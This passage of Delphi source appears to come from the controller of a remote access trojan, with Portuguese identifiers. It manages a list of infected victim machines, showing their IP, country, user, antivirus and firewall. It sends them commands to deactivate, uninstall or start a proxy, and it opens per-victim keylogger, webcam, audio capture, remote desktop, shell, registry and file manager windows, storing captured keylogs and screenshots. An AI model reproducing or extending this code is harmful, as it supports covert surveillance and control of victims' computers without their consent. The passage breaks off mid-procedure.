procedure TFormMain.Desativar1Click(Sender: TObject);
var
  ConAux: TConexaoNew;
  Node: pVirtualNode;
begin
  if MessageBox(Handle,
                pwidechar(Traduzidos[563] + '?'),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    if vsSelected in Node.States then
    begin
      ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
      if (ConAux <> nil) and (Node.ChildCount <= 0) then
      begin
        ConAux.EnviarString(DESATIVAR + DelimitadorComandos);
      end;
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.Desinstalar1Click(Sender: TObject);
var
  ConAux: TConexaoNew;
  Node: pVirtualNode;
begin
  if MessageBox(Handle,
                pwidechar(Traduzidos[136] + '?'),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    if vsSelected in Node.States then
    begin
      ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
      if (ConAux <> nil) and (Node.ChildCount <= 0) then
      begin
        ConAux.EnviarString(DESINSTALAR + DelimitadorComandos);
      end;
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.Desktop1Click(Sender: TObject);
var
  TempDir: string;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
begin
  if MainList.SelectedCount <= 0 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  TempDir := ExtractFilePath(paramstr(0)) + 'Downloads\' + ConAux.NomeDoServidor + '\DesktopImages';
  ForceDirectories(TempDir);
  ShellExecute(0,
               'open',
               'explorer.exe',
               pWideChar(TempDir),
               '',
               SW_NORMAL);
end;

procedure TFormMain.DisconnectServers(AContext: TIdContext);
var
  ConAux: TConexaoNew;
  i, TempInt: integer;
  Node, TempNode: pVirtualNode;
  TempStr: string;
  p: pointer;
begin
  ConAux := TConexaoNew(AContext);

  if (ConAux.Node <> nil) and (Assigned(ConAux.Node) = True) then
  begin
    PostMessage(FormMain.Handle, WM_DELETENODE, 0, integer(ConAux));
    Application.ProcessMessages;

    if ConAux.DesktopBitmap <> nil then ConAux.DesktopBitmap.Free;

    if TrayIcon1.Visible then
    begin
      TrayIcon1.BalloonFlags := bfError;
      TrayIcon1.BalloonTitle := NomeDoPrograma + ' ' + VersaoDoPrograma;
      TrayIcon1.BalloonHint := ConAux.NomeDoServidor + #13#10 + ConAux.Pais + ': ' + ConAux.IPWAN;
      TrayIcon1.ShowBalloonHint;
    end;

    if VNotify then
    begin
      TempStr := IntToStr(ConAux.ImagemBandeira) + '|' + ConAux.NomeDoServidor + #13#10 + 'IP: ' + ConAux.IPWAN;
      TempInt := Length(TempStr) * 2;
      GetMem(p, TempInt);
      CopyMemory(p, @TempStr[1], TempInt);
      PostMessage(FormMain.Handle, WM_SHOWDISCONNECT, TempInt, integer(p));
      Application.ProcessMessages;
    end;

    if ControlCenter = False then
    begin
      CheckForms(ConAux, True, True);
    end else
    begin
      if ConAux.FormDesktop <> nil then
      if TFormDesktop(ConAux.FormDesktop).Visible then PostMessage(TFormDesktop(ConAux.FormDesktop).Handle, WM_CLOSEFREE, 0, 0);

      if ConAux.FormWebcam <> nil then
      if TFormWebcam(ConAux.FormWebcam).Visible then PostMessage(TFormWebcam(ConAux.FormWebcam).Handle, WM_CLOSEFREE, 0, 0);

      if ConAux.FormAudioCapture <> nil then
      if TFormAudioCapture(ConAux.FormAudioCapture).Visible then PostMessage(TFormAudioCapture(ConAux.FormAudioCapture).Handle, WM_CLOSEFREE, 0, 0);

      if ConAux.FormAll <> nil then
      if TFormAll(ConAux.FormAll).Visible then PostMessage(TFormAll(ConAux.FormAll).Handle, WM_CLOSEFREE, 0, 0);
    end;

    sleep(500);
    Application.ProcessMessages;

    if ConAux.FormProcessos <> nil then
    begin
      ConAux.FormProcessos.Release;
      ConAux.FormProcessos := nil;
    end;
    if ConAux.FormWindows <> nil then
    begin
      ConAux.FormWindows.Release;
      ConAux.FormWindows := nil;
    end;
    if ConAux.FormServices <> nil then
    begin
      ConAux.FormServices.Release;
      ConAux.FormServices := nil;
    end;
    if ConAux.FormRegedit <> nil then
    begin
      ConAux.FormRegedit.Release;
      ConAux.FormRegedit := nil;
    end;
    if ConAux.FormShell <> nil then
    begin
      ConAux.FormShell.Release;
      ConAux.FormShell := nil;
    end;
    if ConAux.FormFileManager <> nil then
    begin
      ConAux.FormFileManager.Release;
      ConAux.FormFileManager := nil;
    end;
    if ConAux.FormClipboard <> nil then
    begin
      ConAux.FormClipboard.Release;
      ConAux.FormClipboard := nil;
    end;
    if ConAux.FormListarDispositivos <> nil then
    begin
      ConAux.FormListarDispositivos.Release;
      ConAux.FormListarDispositivos := nil;
    end;
    if ConAux.FormActivePorts <> nil then
    begin
      ConAux.FormActivePorts.Release;
      ConAux.FormActivePorts := nil;
    end;
    if ConAux.FormProgramas <> nil then
    begin
      ConAux.FormProgramas.Release;
      ConAux.FormProgramas := nil;
    end;
    if ConAux.FormDiversos <> nil then
    begin
      ConAux.FormDiversos.Release;
      ConAux.FormDiversos := nil;
    end;
    if ConAux.FormDesktop <> nil then
    begin
      ConAux.FormDesktop.Release;
      ConAux.FormDesktop := nil;
    end;
    if ConAux.FormWebcam <> nil then
    begin
      ConAux.FormWebcam.Release;
      ConAux.FormWebcam := nil;
    end;
    if ConAux.FormAudioCapture <> nil then
    begin
      ConAux.FormAudioCapture.Release;
      ConAux.FormAudioCapture := nil;
    end;
    if ConAux.FormCHAT <> nil then
    begin
      ConAux.FormCHAT.Release;
      ConAux.FormCHAT := nil;
    end;
    if ConAux.FormKeylogger <> nil then
    begin
      ConAux.FormKeylogger.Release;
      ConAux.FormKeylogger := nil;
    end;
    if ConAux.FormServerSettings <> nil then
    begin
      ConAux.FormServerSettings.Release;
      ConAux.FormServerSettings := nil;
    end;
    if ConAux.FormMSN <> nil then
    begin
      ConAux.FormMSN.Release;
      ConAux.FormMSN := nil;
    end;
    if ConAux.FormAll <> nil then
    begin
      ConAux.FormAll.Release;
      ConAux.FormAll := nil;
    end;

  end;

  ConAux.MasterIdentification := -1;
end;

procedure TFormMain.AbrirDiversos(ConAux: TConexaoNew);
var
  NovaJanelaDiversos: TFormDiversos;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormDiversos <> nil then
  begin
    if TFormDiversos(ConAux.FormDiversos).Visible then
    begin
      TFormDiversos(ConAux.FormDiversos).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormDiversos(ConAux.FormDiversos).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormDiversos(ConAux.FormDiversos).Align := alClient;
      TFormDiversos(ConAux.FormDiversos).BorderStyle := bsNone;
    end else
    begin
      TFormDiversos(ConAux.FormDiversos).Parent := nil;
      TFormDiversos(ConAux.FormDiversos).Align := alNone;
      TFormDiversos(ConAux.FormDiversos).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaDiversos := TFormDiversos.Create(self, ConAux);
    ConAux.FormDiversos := NovaJanelaDiversos;
    NovaJanelaDiversos.Caption := traduzidos[427] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormDiversos(ConAux.FormDiversos).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormDiversos(ConAux.FormDiversos).Align := alClient;
      TFormDiversos(ConAux.FormDiversos).BorderStyle := bsNone;
    end else
    begin
      TFormDiversos(ConAux.FormDiversos).Parent := nil;
      TFormDiversos(ConAux.FormDiversos).Align := alNone;
      TFormDiversos(ConAux.FormDiversos).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormDiversos(ConAux.FormDiversos).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormDiversos(ConAux.FormDiversos).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;
  TFormDiversos(ConAux.FormDiversos).Caption := traduzidos[427] + ' (' + ConAux.NomeDoServidor + ')';
  TFormDiversos(ConAux.FormDiversos).Show;
end;

procedure TFormMain.Diversos1Click(Sender: TObject);
var
  NovaJanelaDiversos: TFormDiversos;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirDiversos(ConAux);
end;

procedure TFormMain.DynDNS1Click(Sender: TObject);
var
  resStream: TResourceStream;
  JPG: TJpegImage;
begin
  JPG := TJpegImage.Create;
  resStream := TResourceStream.Create(hInstance, 'DYNDNS', 'dyndnsfile');
  JPG.LoadFromStream(resStream);
  resStream.Free;

  Application.CreateForm(TFormUpdateIP, FormUpdateIP);
  FormUpdateIP.Image1.Picture.Bitmap.Assign(JPG);
  JPG.Free;

  FormUpdateIP.Caption := Traduzidos[577] + ' (DynDNS)';
  FormUpdateIP.Label1.Caption := Traduzidos[578] + ':';
  FormUpdateIP.Label2.Caption := Traduzidos[579] + ':';
  FormUpdateIP.Label3.Caption := Traduzidos[580] + ':';
  FormUpdateIP.Label4.Caption := Traduzidos[581] + ':';
  FormUpdateIP.CheckBox1.Caption := Traduzidos[47];
  FormUpdateIP.Button2.Caption := Traduzidos[120];

  FormUpdateIP.Edit1.Text := '127.0.0.1';
  FormUpdateIP.Edit2.Text := DynDNSHost;
  FormUpdateIP.Edit3.Text := DynDNSUser;
  FormUpdateIP.Edit4.Text := DynDNSPass;

  if FormUpdateIP.ShowModal = mrOK then
  try
    FormUpdateIP.DynDNSUpdate(FormUpdateIP.Edit2.Text,
                              FormUpdateIP.Edit3.Text,
                              FormUpdateIP.Edit4.Text,
                              FormUpdateIP.Edit1.Text);
    finally
    if MessageBox(Handle,
                  pchar(Traduzidos[582] + '?'),
                  pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                  MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) = idYes then
    begin
      DynDNSHost := FormUpdateIP.Edit2.Text;
      DynDNSUser := FormUpdateIP.Edit3.Text;
      DynDNSPass := FormUpdateIP.Edit4.Text;
    end;
    FormUpdateIP.Release;
    FormUpdateIP := nil;
  end;
end;

procedure TFormMain.IdTCPServerConnectAlternative(AContext: TIdContext);
begin
  AContext.Connection.Disconnect;
end;

procedure TFormMain.IdTCPServerExecuteAlternative(AContext: TIdContext);
begin
  AContext.Connection.Disconnect;
end;

procedure TFormMain.Iniciar1Click(Sender: TObject);
var
  i: integer;
  Node: pVirtualNode;
  ConAux: TConexaoNew;
  Command: string;
begin
  application.ProcessMessages;

  Command := LastProxyPort;

  if inputquery('Proxy', pwidechar(traduzidos[132]), Command) = false then exit;

  try
    i := StrToInt(Command);
    except
    MessageBox(Handle, pchar(traduzidos[133]), 'Proxy', MB_ICONERROR);
    exit;
  end;

  if (i <= 0) and (i > 65535) then
  begin
    MessageBox(Handle, pchar(traduzidos[133]), 'Proxy', MB_ICONERROR);
    exit;
  end;

  LastProxyPort := Command;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      if (ConAux.IPWAN <> ConAux.IPLAN) and
         (ConAux.IPLAN <> '127.0.0.1') then //Upnp
      ConAux.EnviarString(PROXYSTART + '|' + LastProxyPort + '|' + 'T') else
      ConAux.EnviarString(PROXYSTART + '|' + LastProxyPort + '|' + 'F');
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.JanelasAlwasOnTop1Click(Sender: TObject);
var
  h: THandle;
  i: integer;
begin
  Application.CreateForm(TFormAlwaysOnTop, FormAlwaysOnTop);
  FormAlwaysOnTop.Caption := Traduzidos[620];
  FormAlwaysOnTop.ListView1.Column[0].Caption := Traduzidos[209];
  FormAlwaysOnTop.ListView1.Column[1].Caption := Traduzidos[210];

  FormAlwaysOnTop.Check1.Caption := Traduzidos[621];
  FormAlwaysOnTop.UnCheck1.Caption := Traduzidos[622];
  FormAlwaysOnTop.Apply1.Caption := Traduzidos[139];
  FormAlwaysOnTop.SpeedButton1.Caption := Traduzidos[139];
  try
    if FormAlwaysOnTop.ShowModal = mrOK then
    begin
      for I := 0 to FormAlwaysOnTop.ListView1.Items.Count - 1 do
      begin
        h := StrToInt(FormAlwaysOnTop.ListView1.Items.Item[i].Caption);
        if FormAlwaysOnTop.ListView1.Items.Item[i].Checked then
        SetWindowpos(h, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOACTIVATE or SWP_NOMOVE or SWP_NOSIZE) else
        SetWindowpos(h, HWND_BOTTOM, 0, 0, 0, 0, SWP_NOACTIVATE or SWP_NOMOVE or SWP_NOSIZE);
      end;
    end;
    finally
    FormAlwaysOnTop.Release;
    FormAlwaysOnTop := nil;
  end;
end;

procedure TFormMain.AbrirKeylogger(ConAux: TConexaoNew);
var
  NovaJanelaKeylogger: TFormKeylogger;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormKeylogger <> nil then
  begin
    if TFormKeylogger(ConAux.FormKeylogger).Visible then
    begin
      TFormKeylogger(ConAux.FormKeylogger).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormKeylogger(ConAux.FormKeylogger).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormKeylogger(ConAux.FormKeylogger).Align := alClient;
      TFormKeylogger(ConAux.FormKeylogger).BorderStyle := bsNone;
    end else
    begin
      TFormKeylogger(ConAux.FormKeylogger).Parent := nil;
      TFormKeylogger(ConAux.FormKeylogger).Align := alNone;
      TFormKeylogger(ConAux.FormKeylogger).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaKeylogger := TFormKeylogger.Create(self, ConAux);
    ConAux.FormKeylogger := NovaJanelaKeylogger;
    NovaJanelaKeylogger.Caption := traduzidos[499] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormKeylogger(ConAux.FormKeylogger).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormKeylogger(ConAux.FormKeylogger).Align := alClient;
      TFormKeylogger(ConAux.FormKeylogger).BorderStyle := bsNone;
    end else
    begin
      TFormKeylogger(ConAux.FormKeylogger).Parent := nil;
      TFormKeylogger(ConAux.FormKeylogger).Align := alNone;
      TFormKeylogger(ConAux.FormKeylogger).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormKeylogger(ConAux.FormKeylogger).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormKeylogger(ConAux.FormKeylogger).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;
  TFormKeylogger(ConAux.FormKeylogger).Caption := traduzidos[499] + ' (' + ConAux.NomeDoServidor + ')';
  TFormKeylogger(ConAux.FormKeylogger).Show;
end;

procedure TFormMain.Keylogger1Click(Sender: TObject);
var
  NovaJanelaKeylogger: TFormKeylogger;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirKeylogger(ConAux);
end;

procedure TFormMain.Keylogger2Click(Sender: TObject);
var
  TempDir: string;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
begin
  if MainList.SelectedCount <= 0 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  TempDir := ExtractFilePath(paramstr(0)) + 'Downloads\' + ConAux.NomeDoServidor + '\Keylogger';
  ForceDirectories(TempDir);
  ShellExecute(0,
               'open',
               'explorer.exe',
               pWideChar(TempDir),
               '',
               SW_NORMAL);
end;

procedure TFormMain.MainListAddToSelection(Sender: TBaseVirtualTree;
  Node: PVirtualNode);
var
  ConAux: pConexaoNew;
  Li: TListItem;
  NodePosition: integer;
  TempNode: pVirtualNode;
  d: Single;
begin
  NodePosition := Sender.GetNodeLevel(node);
  if NodePosition < 0 then Exit;
  if NodePosition = 0 then MainList.Selected[Node] := False;

  if (NodePosition = 0) and (Node.ChildCount > 0) then // Node do grupo...
  begin
    TempNode := MainList.GetNext(Node);
    while Assigned(TempNode) do
    begin
      if TempNode.Parent = Node then MainList.Selected[TempNode] := True;
      TempNode := MainList.GetNext(TempNode);
    end;
    Exit;
  end;

  ConAux := MainList.GetNodeData(Node);

  if Node.ChildCount = 0 then // servers não tem Child
  begin
    if ConAux^.MasterIdentification <> 1234567890 then
    begin
      MainList.DeleteNode(Node);
      exit;
    end;
  end;

  if sFrameBar1.Visible = False then Exit;

  if ConAux^.DesktopBitmap <> nil then
  try
    d := ConAux^.DesktopBitmap.Height / ConAux^.DesktopBitmap.Width;
    Image1.Height := round(d * Image1.Width);

    Image1.Picture := nil;
    Image1.Picture.Bitmap.Assign(ConAux^.DesktopBitmap);
    except
    Image1.Picture := nil;
    exit;
  end else Image1.Picture := nil;

  if ListView1.Items.Count > 0 then ListView1.Items.Clear;
  Li := ListView1.Items.Add;
  Li.ImageIndex := 55;
  Li.Caption := ConAux^.NomeDoServidor;

  Li := ListView1.Items.Add;
  Li.ImageIndex := OldBitmapCount + ConAux^.ImagemBandeira;
  Li.Caption := ConAux^.Pais;

  Li := ListView1.Items.Add;
  Li.ImageIndex := 101;
  Li.Caption := ConAux^.IPWAN + ' / ' + ConAux^.IPLAN;

  Li := ListView1.Items.Add;
  Li.ImageIndex := 38;
  Li.Caption := ConAux^.NomeDoComputador + ' / ' + ConAux^.NomeDoUsuario;

  Li := ListView1.Items.Add;
  Li.ImageIndex := 48;
  Li.Caption := ConAux^.PASSID ;

  if Length(ConAux^.SistemaOperacional) > 1 then
  begin
    Li := ListView1.Items.Add;
    Li.ImageIndex := 77;
    Li.Caption := ConAux^.SistemaOperacional;
  end;

  if Length(ConAux^.CPU) > 1 then
  begin
    Li := ListView1.Items.Add;
    Li.ImageIndex := 92;
    Li.Caption := ConAux^.CPU;
  end;

  if Length(ConAux^.RAM) > 1 then
  begin
    Li := ListView1.Items.Add;
    Li.ImageIndex := 60;
    Li.Caption := ConAux^.RAM;
  end;

  if Length(ConAux^.AV) > 1 then
  begin
    Li := ListView1.Items.Add;
    Li.ImageIndex := 102;
    Li.Caption := ConAux^.AV;
  end;

  if Length(ConAux^.FW) > 1 then
  begin
    Li := ListView1.Items.Add;
    Li.ImageIndex := 98;
    Li.Caption := ConAux^.FW;
  end;

end;

procedure TFormMain.MainListCompareNodes(Sender: TBaseVirtualTree; Node1,
  Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
var
  N1, N2: int64;
  p1, p2: pConexaoNew;
begin
  p1 := Sender.GetNodeData(Node1); //pConexaoNew(Sender.GetNodeData(Node1))^
  p2 := Sender.GetNodeData(Node2); //pConexaoNew(Sender.GetNodeData(Node2))^

  if Column = 0 then
  Result := CompareText(p1.NomeDoServidor,
                        p2.NomeDoServidor) else
  if Column = 1 then
  Result := CompareText(p1.Pais,
                        p2.Pais) else
  if Column = 2 then
  Result := CompareText(p1.IPWAN,
                        p2.IPWAN) else
  if Column = 3 then
  Result := CompareText(p1.IPLAN,
                        p2.IPLAN) else
  if Column = 4 then
  Result := CompareText(p1.Account,
                        p2.Account) else
  if Column = 5 then
  Result := CompareText(p1.NomeDoComputador,
                        p2.NomeDoComputador) else
  if Column = 6 then
  Result := CompareText(p1.NomeDoUsuario,
                        p2.NomeDoUsuario) else
  if Column = 7 then
  Result := CompareText(p1.CAM,
                        p2.CAM) else
  if Column = 8 then
  Result := CompareText(p1.SistemaOperacional,
                        p2.SistemaOperacional) else
  if Column = 9 then
  Result := CompareText(p1.CPU,
                        p2.CPU) else
  if Column = 10 then
  begin
    try
      N1 := p1.RAMSize;
      N2 := p2.RAMSize;
      if (N1 = n2) then Result := 0 else if (N1 > n2) then Result := 1 else Result := - 1;
      except
      Result := 0;
    end;
  end else
  if Column = 11 then
  Result := CompareText(p1.AV,
                        p2.AV) else
  if Column = 12 then
  Result := CompareText(p1.FW,
                        p2.FW) else
  if Column = 13 then
  Result := CompareText(p1.Versao,
                        p2.Versao) else
  if Column = 14 then
  begin
    try
      N1 := StrToInt(p1.Porta);
      N2 := StrToInt(p2.Porta);
      if (N1 = n2) then Result := 0 else if (N1 > n2) then Result := 1 else Result := - 1;
      except
      Result := 0;
    end;
  end else
  if Column = 15 then
  begin
    try
      N1 := StrToInt(p1.Ping);
      N2 := StrToInt(p2.Ping);
      if (N1 = n2) then Result := 0 else if (N1 > n2) then Result := 1 else Result := - 1;
      except
      Result := 0;
    end;
  end else
  if Column = 16 then
  Result := CompareText(p1.Idle,
                        p2.Idle) else
  if Column = 17 then
  Result := CompareText(p1.PrimeiraExecucao,
                        p2.PrimeiraExecucao) else
  if Column = 18 then
  Result := CompareText(p1.JanelaAtiva,
                        p2.JanelaAtiva) else
  if Column = 19 then
  Result := CompareText(p1.PASSID,
                        p2.PASSID) else
  Result := 0;
end;

procedure TFormMain.MainListDblClick(Sender: TObject);
begin
  if ConTrolCenter = False then Exit;
  if MainList.SelectedCount = 1 then Controlcenter1Click(nil);
end;

procedure TFormMain.MainListGetImageIndex(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Kind: TVTImageKind; Column: TColumnIndex;
  var Ghosted: Boolean; var ImageIndex: Integer);
var
  NodePosition: integer;
  ConAux: pConexaoNew;
begin
  NodePosition := Sender.GetNodeLevel(node);
  if NodePosition < 0 then Exit;
  if not (Kind in [ikNormal, ikSelected]) then Exit;

  ConAux := Sender.GetNodeData(Node);

  if (ConAux^.MasterIdentification <> 1234567890) and (ConAux^.MasterIdentification <> 11111) then
  begin
    Exit;
  end;

  if NodePosition = 0 then // Node dos grupos
  begin
    case Column of
      0: begin
           if MainList.Images = DesktopImageList then
             ImageIndex := -1 else ImageIndex := 251;
         end else ImageIndex := -1;
    end;
  end else

  if NodePosition = 1 then // Node dos servers
  begin
    case Column of
      0: if MainList.Images = DesktopImageList then
           ImageIndex := ConAux^.ImagemDesktop else ImageIndex := ConAux^.ImagemBandeira;
      1: ImageIndex := -1;
      2: ImageIndex := -1;
      3: ImageIndex := -1;
      4: ImageIndex := -1;
      5: ImageIndex := -1;
      6: ImageIndex := -1;
      7: if MainList.Images = DesktopImageList then
           ImageIndex := -1 else ImageIndex := ConAux^.ImagemCam;
      8: ImageIndex := -1;
      9: ImageIndex := -1;
      10: ImageIndex := -1;
      11: ImageIndex := -1;
      12: ImageIndex := -1;
      13: ImageIndex := -1;
      14: ImageIndex := -1;
      15: if MainList.Images = DesktopImageList then
           ImageIndex := -1 else ImageIndex := ConAux^.ImagemPing;
      16: ImageIndex := -1;
      17: ImageIndex := -1;
      18: ImageIndex := -1;
    end;
    if ConAux^.NomeDoServidor = '' then MainList.DeleteNode(node);
  end;

end;

procedure TFormMain.MainListGetNodeDataSize(Sender: TBaseVirtualTree;
  var NodeDataSize: Integer);
begin
  NodeDataSize := NewNodeSize;
end;

procedure TFormMain.MainListGetPopupMenu(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Column: TColumnIndex; const P: TPoint;
  var AskParent: Boolean; var PopupMenu: TPopupMenu);
begin
  PopupMenu := MainListPopup;
end;

procedure TFormMain.MainListGetText(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Column: TColumnIndex; TextType: TVSTTextType;
  var CellText: string);
var
  NodePosition: integer;
  ConAux: pConexaoNew;
  i: integer;
begin
  NodePosition := Sender.GetNodeLevel(node);
  if NodePosition < 0 then Exit;

  ConAux := Sender.GetNodeData(Node);

  if (ConAux^.MasterIdentification <> 1234567890) and (ConAux^.MasterIdentification <> 11111) then
  begin
    Exit;
  end;

  if NodePosition = 0 then // Node dos grupos
  begin
    case Column of
      0: begin
           try
             i := MainList.ChildCount[Node];
             except
             i := 0;
           end;
           CellText := ConAux^.GroupName + ' (' + IntToStr(i) + ')';
           if (i <= 0) or (i > 99999) then MainList.IsVisible[Node] := False else
           MainList.IsVisible[Node] := True;
        end else CellText := '';
    end;
  end else

  if NodePosition = 1 then // Node dos servers
  begin
    case Column of
      0: CellText := ConAux^.NomeDoServidor;
      1: CellText := ConAux^.Pais;
      2: CellText := ConAux^.IPWAN;
      3: CellText := ConAux^.IPLAN;
      4: CellText := ConAux^.Account;
      5: CellText := ConAux^.NomeDoComputador;
      6: CellText := ConAux^.NomeDoUsuario;
      7: CellText := ConAux^.CAM;
      8: CellText := ConAux^.SistemaOperacional;
      9: CellText := ConAux^.CPU;
      10: CellText := ConAux^.RAM;
      11: CellText := ConAux^.AV;
      12: CellText := ConAux^.FW;
      13: CellText := ConAux^.Versao;
      14: CellText := ConAux^.Porta;
      15: CellText := ConAux^.Ping;
      16: CellText := ConAux^.Idle;
      17: CellText := ConAux^.PrimeiraExecucao;
      18: CellText := ConAux^.JanelaAtiva;
      19: CellText := ConAux^.PASSID;
    end;
    if ConAux^.NomeDoServidor = '' then MainList.DeleteNode(Node);
  end;

end;

procedure TFormMain.MainListHeaderClick(Sender: TVTHeader;
  HitInfo: TVTHeaderHitInfo);
begin
  if HitInfo.Button = mbLeft then
  begin
    if Sender.SortColumn > NoColumn then
    Sender.Columns[Sender.SortColumn].Options:= Sender.Columns[Sender.SortColumn].Options + [coParentColor];

    if (Sender.SortColumn = NoColumn) or (Sender.SortColumn <> HitInfo.Column) then
    begin
      Sender.SortColumn:= HitInfo.Column;
      Sender.SortDirection:= sdAscending;
    end
    else
    begin
      if Sender.SortDirection = sdAscending then
      Sender.SortDirection := sdDescending
      else
      Sender.SortDirection := sdAscending;
    end;
    Sender.Treeview.SortTree(Sender.SortColumn, Sender.SortDirection, False);
  end else
  if HitInfo.Button = mbRight then MainListPopup := PopupMenuColumns;
end;

procedure TFormMain.MainListInitNode(Sender: TBaseVirtualTree; ParentNode,
  Node: PVirtualNode; var InitialStates: TVirtualNodeInitStates);
begin
  Node.CheckType := ctNone;
  Sender.CheckState[Node] := csCheckedNormal;
  Sender.CheckState[Node] := csUnCheckedNormal;
end;

procedure TFormMain.MainListMeasureItem(Sender: TBaseVirtualTree;
  TargetCanvas: TCanvas; Node: PVirtualNode; var NodeHeight: Integer);
begin
  NodeHeight := MainList.Images.Height;
  if (MainList.GetNodeLevel(Node) = 0) and (MainList.Images = DesktopImageList) then
  NodeHeight := 16;
end;

procedure TFormMain.MainListMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
var
  p: TPoint;
  Node: PVirtualNode;
  Rect: TRect;
  ConAux: pConexaoNew;
begin
{
  p := MainList.ScreenToClient(Mouse.CursorPos);
  Node := MainList.GetNodeAt(p.X, p.Y);
  if Node <> nil then
  begin
    ConAux := MainList.GetNodeData(Node);
    //Fazer alguma coisa...


  end;
}



{ Exemplo:

  if Node <> nil then
  begin
    Rect := MainList.GetDisplayRect(Node, -1, false);
    MainList.Canvas.Brush.Color := clRed;
    MainList.Canvas.FillRect(Rect);
  end;
}
end;

procedure TFormMain.MainListNodeDblClick(Sender: TBaseVirtualTree;
  const HitInfo: THitInfo);
begin
 Configuraesdoservidor1Click(Configuraesdoservidor1);
end;

procedure TFormMain.MainListPaintText(Sender: TBaseVirtualTree;
  const TargetCanvas: TCanvas; Node: PVirtualNode; Column: TColumnIndex;
  TextType: TVSTTextType);
var
  ConAux: pConexaoNew;
begin
  AtualizarQuantidade;
  ConAux := MainList.GetNodeData(Node);
  TargetCanvas.Font.Color := ConAux^.FontColor;
end;

procedure TFormMain.Modificarconfiguraes1Click(Sender: TObject);
var
  ConfigFile: WideString;
  TempStr, Tosend: WideString;
  p: pointer;
  Size: int64;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
